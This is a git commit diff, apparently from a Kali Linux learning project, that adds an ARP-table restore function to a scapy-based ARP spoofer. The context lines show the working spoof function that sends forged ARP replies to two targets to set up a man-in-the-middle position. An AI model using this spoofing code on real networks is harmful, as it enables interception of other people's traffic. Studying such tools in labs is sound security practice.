71a2c726fc3d59b6db90b34a8638399fa331af9b
root <root@kali.kali>
2026-02-27 07:33:40 -0600

    added restore function to ARP spoofer

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -26,6 +26,13 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
 target_1, target_2 = get_arguments()
 
 packets_count = 0
@@ -37,4 +44,6 @@ try:
         print("\r[+] Packets sent:" + str(packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[-] Detected CTRL+C ... Quitting")
+    print("\n[-] Detected CTRL+C ... Resetting ARP tables")
+    restore(target_1, target_2)
+    restore(target_2, target_1)
